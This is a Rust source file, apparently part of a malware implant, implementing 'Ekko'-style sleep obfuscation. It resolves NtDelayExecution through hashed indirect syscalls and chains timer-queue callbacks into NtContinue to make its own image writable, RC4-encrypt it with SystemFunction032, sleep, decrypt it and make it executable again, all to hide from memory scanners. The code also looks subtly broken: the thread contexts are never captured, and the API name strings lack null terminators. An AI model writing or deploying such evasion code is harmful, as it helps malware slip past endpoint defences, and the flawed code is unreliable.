extern crate winapi;

use std::mem;
use std::ptr::null;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{PVOID, LARGE_INTEGER, NTSTATUS};
use winapi::um::heapapi::GetProcessHeap;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::synchapi::{CreateEventW, SetEvent, WaitForSingleObject};
use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer};
use winapi::um::winnt::{RtlCaptureContext, CONTEXT, WT_EXECUTEINTIMERTHREAD};

use crate::hellshall::{NtSyscall, SetSSn, fetch_nt_syscall, crc32h};

#[repr(C)]
pub struct UString {
    length: u32,
    max_length: u32,
    buffer: *mut c_void,
}

pub fn smart_ekko(sleep_time_ms: u32) {
    unsafe {
        // STEP 0: fetch NtDelayExecution syscall
        let mut nt_delay = NtSyscall {
            dw_ssn: 0,
            dw_syscall_hash: 0,
            p_syscall_address: null_mut(),
            p_syscall_inst_address: null_mut(),
        };
        let delay_hash = crc32h("NtDelayExecution");
        if !fetch_nt_syscall(delay_hash, &mut nt_delay) {
            return;
        }
        SetSSn(nt_delay.dw_ssn as u16, nt_delay.p_syscall_inst_address);

        // STEP 1: prepare CONTEXTs
        let mut ctx_thread: CONTEXT = mem::zeroed();
        let mut rop_prot_rw: CONTEXT = mem::zeroed();
        let mut rop_mem_enc: CONTEXT = mem::zeroed();
        let mut rop_delay: CONTEXT = mem::zeroed();
        let mut rop_mem_dec: CONTEXT = mem::zeroed();
        let mut rop_prot_rx: CONTEXT = mem::zeroed();
        let mut rop_set_evt: CONTEXT = mem::zeroed();

        let h_timer_queue = CreateTimerQueue();
        let h_event = CreateEventW(null_mut(), 0, 0, null());

        let image_base = GetModuleHandleA(null());
        let dos_header = image_base as *const u32;
        let e_lfanew = *dos_header.offset(0x3C);
        let nt_headers = image_base.add(e_lfanew as usize) as *const u8;
        let optional_header = nt_headers.add(24) as *const u32;
        let image_size = *optional_header.offset(2);

        let key_buf: [u8; 16] = [0x55; 16];
        let key = UString {
            length: 16,
            max_length: 16,
            buffer: key_buf.as_ptr() as *mut c_void,
        };
        let img = UString {
            length: image_size,
            max_length: image_size,
            buffer: image_base as *mut c_void,
        };

        let sys_func_032 = GetProcAddress(
            LoadLibraryA("Advapi32.dll".as_ptr() as *const i8),
            "SystemFunction032".as_ptr() as *const i8,
        );

        // STEP 2: build LARGE_INTEGER for NtDelayExecution
        let mut interval: LARGE_INTEGER = mem::zeroed();
        // write negative 100-ns intervals directly into the union
        *(&mut interval as *mut _ as *mut i64) = -((sleep_time_ms as i64) * 10_000);

        // STEP 3: populate ROP contexts
        rop_prot_rw.Rsp -= 8;
        rop_prot_rw.Rip = VirtualProtect as u64;
        rop_prot_rw.Rcx = image_base as u64;
        rop_prot_rw.Rdx = image_size as u64;
        rop_prot_rw.R8 = 0x04;

        rop_mem_enc.Rsp -= 8;
        rop_mem_enc.Rip = sys_func_032 as u64;
        rop_mem_enc.Rcx = (&img as *const _) as u64;
        rop_mem_enc.Rdx = (&key as *const _) as u64;

        rop_delay.Rsp -= 0x10;
        rop_delay.Rip = nt_delay.p_syscall_inst_address as u64;
        rop_delay.Rcx = 0;
        let ptr_to_interval_on_stack = (rop_delay.Rsp + 0x8) as *mut LARGE_INTEGER;
        std::ptr::write(ptr_to_interval_on_stack, interval);
        rop_delay.Rdx = ptr_to_interval_on_stack as u64;

        rop_mem_dec.Rsp -= 8;
        rop_mem_dec.Rip = sys_func_032 as u64;
        rop_mem_dec.Rcx = (&img as *const _) as u64;
        rop_mem_dec.Rdx = (&key as *const _) as u64;

        rop_prot_rx.Rsp -= 8;
        rop_prot_rx.Rip = VirtualProtect as u64;
        rop_prot_rx.Rcx = image_base as u64;
        rop_prot_rx.Rdx = image_size as u64;
        rop_prot_rx.R8 = 0x40;

        rop_set_evt.Rsp -= 8;
        rop_set_evt.Rip = SetEvent as u64;
        rop_set_evt.Rcx = h_event as u64;

        // STEP 4: queue ROP callbacks
        let mut h_new_timer: *mut c_void = null_mut();
        let mut delay = 100;
        for ctx in [
            &rop_prot_rw,
            &rop_mem_enc,
            &rop_delay,
            &rop_mem_dec,
            &rop_prot_rx,
            &rop_set_evt,
        ] {
            if CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                Some(nt_continue_wrapper),
                ctx as *const _ as PVOID,
                delay,
                0,
                WT_EXECUTEINTIMERTHREAD,
            ) == 0
            {
                break;
            }
            delay += 100;
        }

        // STEP 5: wait on event
        if !h_event.is_null() {
            WaitForSingleObject(h_event, 0x32);
        }
    }
}

extern "system" fn timer_callback(
    lp_parameter: *mut winapi::ctypes::c_void,
    _dw_timer_low_value: u8,
) {
    let context = lp_parameter as *mut CONTEXT;
    unsafe {
        RtlCaptureContext(context);
    }
}

extern "system" fn nt_continue_wrapper(
    lp_parameter: *mut winapi::ctypes::c_void,
    _dw_timer_low_value: u8,
) {
    let context = lp_parameter as *mut CONTEXT;
    unsafe {
        let nt_continue: unsafe extern "system" fn(*mut CONTEXT) -> NTSTATUS = std::mem::transmute(
            GetProcAddress(
                GetModuleHandleA("Ntdll\0".as_ptr() as *const _),
                "NtContinue\0".as_ptr() as *const _,
            ),
        );
        nt_continue(context);
    }
}
